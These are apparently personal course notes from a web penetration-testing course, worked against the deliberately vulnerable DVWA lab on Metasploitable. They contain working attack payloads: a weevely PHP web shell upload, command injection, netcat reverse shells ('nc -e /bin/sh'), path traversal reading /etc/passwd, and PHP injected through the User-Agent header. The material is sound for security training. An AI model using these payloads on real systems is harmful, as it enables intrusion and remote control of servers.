# Metasploit Course Notes

Welcome to the [Metasploit](https://www.metasploit.com/) course notes for the Udemy course [Learn Website Hacking / Penetration Testing From Scratch](https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/)

## Starting Kali Linux

Fire up the Kali Linux Virtual Box image and login using the username:password - `root:toor`

## Starting Metasploitable

Fire up the Metasplotable Virtual Box image and login using the username:password - `msfadmin:msfadmin`. Run `ifconfig` and make a note of the IP address. Then in the Kali Linux instance, open Firefox and paste in the IP address to the address bar. You can now play with Metasplotable web applications via the browser in Kali Linux!

## Open DVWA

Clik the [DVWA](http://www.dvwa.co.uk/) link from the home page of Metasplotable. Login using the username:password - `Admin:password`

## Information gathering

First things first. You must know your target! Here are some tools to gather information you need:

* [WhoIs Tools](http://whois.domaintools.com/) - Find information about the owner of the target site
* [Netcraft Site Report](https://toolbar.netcraft.com/) - Find information about the technology used
* [BuiltWith](http://builtwith.com/) - Find information about the technology used
* [Robtex DNS Lookup](http://robtex.com) - Comprehensive DNS information about the target site
* [Subdomain Discovery](https://github.com/guelfoweb/knock) - Subdomain scanner (requires git clone)

Basic usage of Knock outlined below:

```
# Do this in Kali Linux :)
git clone https://github.com/guelfoweb/knock.git
cd knock
sudo python setup.py install
knockpy -h
knockpy rotati.com
```

* [Files & Directories using DIRB](https://tools.kali.org/web-applications/dirb) - DIRB  IS  a  Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.

Use `dirb` (within Kali Linux) like so: `dirb http://example.com`

This will scan example.com for a large number of potentially accessible files. The dirb application has a list of common words that it may check for `/usr/share/dirb/wordlists/common.txt` For example it might try the following:

```
+ http://example.com/.ssh                                              
+ http://example.com/.subversion (CODE:200|SIZE:32854)                                         
+ http://example.com/.svn 
+ http://example.com/.swf 
+ http://example.com/.web 
+ http://example.com/404 
+ http://example.com/500 
+ http://example.com/about
+ http://example.com/admin
+ http://example.com/admin.cgi 
+ http://example.com/admin.php 
+ http://example.com/admin.pl
+ http://example.com/ajax 
+ http://example.com/AT-admin.cgi
+ http://example.com/blog

...etc, etc
```

* [Maltego](https://en.wikipedia.org/wiki/Maltego) - Maltego is software used for gathering and managing open-source intelligence and forensics.

## Exploitations

This section is about discovering and using exploits.

## Discover exploits

Once you have the information about the target its now time to check what exploits are possible. Here are some online tools to help with that:

* [Exploit DB](https://www.exploit-db.com/) - lists publicly known exploits for many different software products
* [IP Search](https://bing.com) - Discover if other sites are running on the same server via an [IP address search](https://www.bing.com/search?q=ip%3A13.250.177.223)

## File upload exploits

Simple exploit that allows uploading of server side script files (like PHP) via a vulnerable file upload form presented on the website.

First create a 'shell' script using the scripting language of the target website. Since we are targeting DVWA, the script can be PHP.

Make sure that the security level in the DVWA website is set to 'low'.

Use `weevely` to generate the script as follows: `weevely generate 123456 /root/shell.php`. Now run `ls -la /root` and you will see the script file. Now go to the DVWA Upload page and upload the php script you just generated.

Now in a terminal type use weevely to control the DVWA server like so: `weevely http://10.0.2.4/dvwa/hackable/uploads/shell.jpg 123456`

## Code execution exploits

Go to the Command Execution example in the DVWA website. Type in an ip address to ping. Then append another commend to it like this: `10.0.2.4;pwd`. You should see the output of the ping + the pwd command meaning that there is a code execution vulnerability here.

With this we can get something known as a 'reverse connection' from the target computer. Here is how:

So in Kali Linux (i.e. the 'attackers computer') start a netcat session like so: `nc -vv -l -p 8080`. This is basically a session that is listening (because of the `-l` switch passed to the `nc` command) for incomming connections on port 8080.

In the DVWA website, go to the Command Execution example and enter the following which will establish a connect with the attacker: `10.0.2.4;nc -e /bin/sh 10.0.2.15 8080`

Just with that, the attacker now essentially has a netcat terminal session with the target machine.

## Local file exploits

Since the fi example in DVWA exploits the file inclusion we can easily read the contents of any file on the server. For example to read the file `/etc/passwd` we just put the following in the address bar of the browser and the contents of the /etc/passwd file are sent back to us `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd`.

So there is a file in linux / unix systems that can be used to read all enviornment variables. The file is `/proc/self/environ`. We can pass that to the server and read the contents like so: `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ`

So with this we can intercept the request (using Burp) and change the 'User-Agent' header value to some php script that we want to execute. Basically we can set up a reverse connection (similar to the code execution example above) again using the following injected code into the header: `<? passthru('nc -e /bin/sh 10.0.2.15 8081');?>`